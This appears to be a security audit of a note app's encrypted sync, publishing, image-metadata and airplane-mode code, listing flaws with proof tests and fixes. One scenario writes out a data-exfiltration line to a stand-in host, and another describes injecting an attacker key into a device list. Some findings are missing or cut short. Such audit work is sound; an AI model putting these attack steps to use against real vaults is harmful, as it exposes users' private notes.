## 1. CRITICAL #472: keyring device list is unauthenticated, so the provider receives the epoch secret

- **Where:** `src/sync/e2ee/keyring.ts:213` builds the recipients of the new epoch from `current.file.devices`, which is plaintext and covered by no MAC. `:231`: `sealed` holds only `{older, revoked}`. The file header comment says it holds `{older, revoked, devices}`; the code leaves `devices` out. `prior.revoked` is never subtracted from the recipients either.
- **Scenario:** The relay, WebDAV host or Dropbox (exactly who E2EE defends against) adds `devices.evil = {recipient: "age1<attacker>", wrap: "junk"}` to `lumen-e2ee-keyring`. On the user's next `rekey()`, which is typically the step that revokes a lost phone, `writeNewEpoch` age-encrypts the new epoch secret to the attacker. That secret derives the keyring key, so the attacker also gets `older` (every earlier secret, epoch 0 included). That means the manifest, all blobs and the names key. The same trick puts a revoked device back in.
- **Proof:** `rev12/r472-keyring-inject.test.ts` fails. The attacker decrypts the wrap and opens the manifest (`attacker read manifest with files: ['secret.md']`).
- **Fix:** Keep the authoritative device list (id → recipient) inside `sealed` (or MAC it with the keyring key). Build recipients only from the authenticated list, and always subtract `prior.revoked`.

## 2. HIGH #472: re-key is not atomic; the vault is wedged, or the passphrase is locked out

- **Where:** `src/sync/e2ee/engine.ts:253` writes the keyring first. Then `:256` writes the header (only on a passphrase change). Then the manifest loop at `:261`. Only `rekey` ever passes `previousKey` to `readManifest` (`:422`/`:432`).
- **Scenario A (manifest write fails: network drop or tab closed):** The keyring is at epoch n+1 and the manifest is still sealed at epoch n. Every device that refreshes, and every fresh unlock, gets epoch n+1 keys, and `openManifest` throws `DecryptError` forever. The re-keying device can't retry: `writeNewEpoch` throws `PreconditionFailedError` because `keys.epoch !== current.file.epoch`.
- **Scenario B (header write fails during a passphrase change):** The keyring's passphrase wrap is under the new passphrase while the header still has the old KDF and salt. Old passphrase: the header MAC passes but the keyring won't open. New passphrase: `WrongPassphraseError`. A new device can't join, and only enrolled age identities can still open the vault.
- **Proof:** `rev12/r472-rekey-torn.test.ts`. Both cases fail (DecryptError; and `opened = 0` for both passphrases).
- **Fix:** Write the header and keyring in an order where each step is still openable (for example, keep the old passphrase wrap until the header lands). In normal rounds, let `readManifest` fall back to `olderSecrets[epoch-1]` for the manifest key, and re-seal on the next round.

## 3. HIGH #473: Publish site bypasses redaction (and photo metadata)

- **Where:** `src/ui/PublishSiteDialog.tsx:93` passes the raw `readAllNotes()` text to `buildSite` (`src/publish/site.ts:275`, which also feeds the site's search index). Its `readAsset` at `:141` returns the original photo bytes. Neither path goes through `exportReadyText` / `prepareForExport`.
- **Scenario:** A journalist marks a source's name `<redact>` and uses "Publish site" to GitHub Pages. The name, the hidden `<!-- -->` notes and the photos' GPS go to a public website.
- **Proof:** `rev12/r473-publish-site.test.ts` fails (the secrets are in the generated files).
- **Fix:** Run `prepareForExport` on every note in `buildSite` (or in the dialog), and pass assets through `stripImageMetadata` unless the user keeps metadata.

## 4. MEDIUM #473: EXIF stripping fails open

- **Where:** `src/lib/imageMetadata.ts:70` and `:82`: any unexpected byte or segment length → `return null` → `stripImageMetadata` returns the **original bytes**, and `cleanImageFile` stores them. `:109` copies everything after the first SOS as is.
- **Scenario:** (a) A single padding byte between segments, which libjpeg tolerates ("extraneous bytes before marker"), keeps the whole EXIF/GPS block. (b) Samsung and Apple MPF secondary images, or a Pixel Motion Photo MP4 appended after EOI, keep their own EXIF/GPS (or MP4 location).
- **Proof:** `rev12/r473-exif.test.ts` fails in both cases.
- **Fix:** Fail closed: when parsing fails, refuse, or re-encode through a canvas and warn. Also cut everything after the first EOI (or parse MPF and strip each image). Report HEIC/AVIF as "not cleaned" in the UI.

## 5. MEDIUM #451: runner iframes escape airplane mode

- **Where:** `src/privacy/airplaneBoot.ts:16-45`. The `<meta>` CSP applies only to the app document. `playground-runner.html` and `livejs-runner.html` are URL-loaded frames with their own header policy (`img-src *`, `media-src *`; `security/policy.json`, route playground-runner). The parent's PerformanceObserver doesn't see their loads, and `RTCPeerConnection` inside them is not wrapped (STUN goes out; CSP doesn't cover WebRTC).
- **Scenario:** With airplane mode on, the user runs a playground block, for example from a shared note, that does `new Image().src = "https://x/?d=" + data`. The request leaves, and the certificate still says 0.
- **Proof:** `rev12/r451-runner-iframe.mjs` (Playwright Chromium). The control request from the app window is blocked, but the runner's request reaches the other origin.
- **Fix:** While airplane mode is on, refuse to run runner blocks (or frame them with a `csp=` attribute / a stricter runner variant), and say in the certificate that frames are not covered.

## 6. MEDIUM #451: a worker's fetch fails open after a 3 s wait

- **Where:** `src/ai/workerLedger.ts:104` and `:119`. When no `state` message arrives within `AIRPLANE_WAIT_MS`, `airplane` stays `null`, so `blocked` is false and the request goes out. The window answers only from the lazily loaded `src/privacy/airplane.ts` (`src/main.tsx:39`). Its `.catch` assumes "the CSP half still holds", but the meta CSP doesn't apply to workers, and the workers' header CSP allows huggingface, jsDelivr and others.
- **Scenario:** The airplane chunk is slow, or not cached while offline. The transformers or WebLLM worker starts a model download, and it goes out.
- **Proof:** `rev12/r451-worker-failopen.test.ts` fails (`sent: ['https://huggingface.co/model.onnx']`).
- **Fix:** Answer `hello` from `airplaneBoot` (synchronous, in the startup bundle). In the worker, treat "no answer" as blocked (fail closed), or pass the flag in the worker's constructor.

## 7. MEDIUM #451: the certificate counts "0 left" when requests did leave (from reading)

- **Where:** `src/privacy/airplaneCertificate.ts:63` counts a resource as leaving only if `transferSize > 0`. For cross-origin resources without `Timing-Allow-Origin`, `transferSize` is always 0. `src/privacy/airplane.ts:307` ignores fetch/XHR in Resource Timing, so a fetch or upload that started before `since` and is still streaming after it is never in the window. `enableAirplaneMode` doesn't abort fetches already in flight.
- **Fix:** Count any non-local cross-origin resource entry as "left" (or "unknown"). Track in-flight fetches with an `AbortController` registry and abort them when the switch goes on.

## 8. MEDIUM #483: relay disk quota is per free token

- **Where:** `sync-server/vault-relay.js:189-190`. Any 32–128-character string is a valid token and creates a space; `maxSpace` (`:212`) is per space. There is no global or per-address byte limit, and the rate limit is 600 requests per minute × 25 MiB.
- **Scenario:** One address fills the public relay's disk (about 15 GB per minute) by rotating tokens.
- **Proof:** `rev12/r483-relay.test.mjs` case (2): 20,000 bytes stored from one address against a 1,000-byte quota.
- **Fix:** Add a global byte cap and a per-address cap on bytes written per day. Optionally require a proof-of-work or signed token to create a space.

## 9. MEDIUM #483: retention deletes vaults that are only read

- **Where:** `vault-relay.js:55` / `:63` (memory) and `:80` / `:95-99` (disk). Only `put` and `delete` touch a space; GET and list don't. `sweep` (`:68`, `:106`) deletes after 180 days.
- **Scenario:** Notes that are synced and read on several devices but not edited for 6 months lose the remote copy. The engine then raises `RollbackError` (anchor > 0) and sync stops; a new device sees an empty vault.
- **Proof:** `rev12/r483-relay.test.mjs` case (1): 404 after 200 days of daily GETs.
- **Fix:** Touch the space on authenticated GET and list (throttled, for example once a day).

## 10. MEDIUM #472: silent migration locks out older builds (from reading)

- **Where:** `src/storage/vault/encrypted/session.ts:145` rewrites the at-rest header to Argon2id on the first unlock, with no opt-in. `src/sync/e2ee/kdf.ts:105`: `newKdfParams()` now defaults to Argon2id, used for new E2EE vaults (`header.ts:61`) and re-keys (`:93`). In the base, `validateKdfParams` throws `KdfUnavailableError("argon2id")`, and `readHeader` re-throws it for both copies. Pre-W1.7 builds also ignore the keyring, so after any re-key they read the manifest with epoch-0 keys.
- **Scenario:** A vault folder shared through Dropbox or iCloud with a desktop (Tauri) build that hasn't updated. After one unlock on the new web build, the old desktop can no longer open the vault. The E2EE sync works the same way.
- **Fix:** Bump the header/protocol version, so older builds show "update Lumen" rather than an opaque KDF error. Gate the migration on "all devices updated", or make it an explicit action.

Notes on the PR's own focus areas:
- **KDF parameter binding:** sound. The at-rest MAC covers `kdf` (`format.ts:177`), and changing the parameters breaks the unwrap anyway.
- **Header downgrade:** an attacker can't forge a weaker header without the data key.
- **Migration atomicity:** fine. Both header copies wrap the same data key, so a torn write leaves either copy valid.
- **Inherent, not new:** rolling back to an older header (an older passphrase, or PBKDF2) still opens the vault, because the data key never rotates.

## 11. MEDIUM #461: note file names enter the usage report

- **Proof:** `rev12/r461-template-name.test.ts` fails.
- **Fix:** Pass only static command ids into `weeklyReport`, or collapse dynamic families (`template.installed.*`, `plugin:*`, `lang.*`) to their prefix before counting.

## 13. LOW #473: the write hook writes plaintext of an unlocked note whose text starts with the magic line

## 15. LOW #469: collab Worker (from reading)

- **Unauthenticated writes:** `edge-workers/collab/worker.mjs:207-218`. `leave()` calls `save()` whenever the last socket closes, even one that never authenticated, so anyone who knows (or guesses) a room name writes DO storage, refreshes `lastWrite` and re-arms the alarm. That costs Free-plan write quota, and retention becomes "nobody connected", not "nobody changed". **Fix:** save only when `onChange` fired since the last save.
- **Check cost:** `sync-server/collab/relay.mjs:74-78`. `checkE2eeUpdate` re-encodes and re-applies the whole room on every keystroke update. Near `MAX_ROOM_BYTES` (4 MB) this is likely to exceed Workers CPU limits. **Fix:** check only the decoded structs of the update, or check them against a cached probe doc.
- **E2EE-only enforcement:** I found no bypass. Non-`e2e` top-level types, map entries, nested Y types and non-envelope items are all rejected; deleted plaintext is GC'd before it is stored or relayed; incomplete updates are refused. Envelope `ct` can of course carry anything a client chooses, and awareness is relayed (not stored) unchecked.
- **Logs:** logs contain no IP addresses.

## 16. LOW #448: origin and decompression

- `src/share/ShareLinkDialog.tsx:25`: `appOrigin()` is `location.origin` (`tauri://…` or `http://localhost:…` in the desktop and dev builds), so links made there open for nobody else.
- `src/share/linkShare.ts:156` puts no cap on the decompressed size, so a 32 KB link or a large `.lumenshare` file can inflate about 1000×; a viewer DoS only.

## #444 (CSP content frame): no confirmed defects

These are the checks I ran:
- **Sandbox flags:** images, media and Gists are opaque (`allow-scripts` only). The Gist is written only when `self.origin === "null"`.
- **Embed mode:** it does run `content-frame.js` at the app origin (`allow-scripts allow-same-origin`). That page has no HTML sink, and its CSP doesn't allow `'self'` frames, so a note can't nest the content frame inside itself.
- **postMessage:** the parent matches `event.source` to its own frames; the frame posts to `location.origin`.
- **Raw iframes:** they need explicit `https:` and go through click-to-load.
- **App policy:** it no longer has the fixed nonce or `https:` in img-src.
- **Hardening only:** embed mode at the app origin plus a public fixed nonce means any future HTML sink in `content-frame.js` would be full app XSS. Consider serving the content frame from a separate origin.

## #483: other checks with no issue found

- **Recovery key:** the wordlist is 256 words, unique after folding, all Hebrew letters, which gives 96 bits. The check word is 1 byte.
- **Relay token:** `relayToken` is an unsalted SHA-256 of the passphrase, a fast oracle for the relay. That's acceptable only because the passphrase is always the 96-bit words (`SetupWizard.tsx:118`); keep it that way.
- **Path traversal in the blob store:** `NAME` allows `.` and `..`, but `path.join(dir, space, "..")` only reaches the store root, and read, rename and unlink on a directory fail. There is no traversal outside `dir`.
